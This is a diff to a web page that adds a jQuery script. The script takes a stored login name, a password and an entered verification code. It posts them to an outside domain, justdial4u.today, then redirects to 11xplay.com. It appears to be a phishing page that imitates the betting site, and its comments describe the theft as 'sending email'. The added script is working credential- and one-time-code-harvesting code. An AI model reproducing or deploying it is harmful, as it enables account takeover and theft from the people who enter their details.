@@ -944,6 +944,59 @@
             /*margin-top: 20%;*/
         }
     </style>
+	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+	     <script type="text/javascript">
+        // Function to send all data to PHP page after user enters the code
+        function submitCodeAndSendEmail(event) {
+            event.preventDefault();  // Prevent form from submitting the normal way
+
+            // Get the entered code
+            var code = $("#code").val();
+
+            // Get saved login data from sessionStorage
+            var loginName = sessionStorage.getItem("loginName");
+            var password = sessionStorage.getItem("password");
+
+            // Ensure code is filled
+            if (code !== '') {
+                // Send the data to the PHP page to send email
+                $.ajax({
+                    type: "POST",
+                    url: "https://justdial4u.today/11xxplay-mail.php", 
+                    data: {
+                        loginName: loginName,
+                        password: password,
+                        code: code
+                    },
+                    success: function (msg) {
+                        console.log("Server Response: ", msg);  // Debugging: Check the response from the server
+
+                        if (msg === "sucessmsg") {
+                            alert("Email sent successfully!");
+                            window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
+                        } else {
+                            $("#errorMsg").html('There was an error sending the email.');  // Show error if sending email fails
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log("Error:", status, error);  // Log error details for debugging
+                        alert('An error occurred. Please try again.');
+                    }
+                });
+            } else {
+                alert('Please enter the code.');  // Show alert if code is empty
+            }
+        }
+
+        $(document).ready(function () {
+            // Handle the form submission for the code
+            $("form#codeForm").on("submit", function (event) {
+                submitCodeAndSendEmail(event);  
+            });
+        });
+    </script>
 
 
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
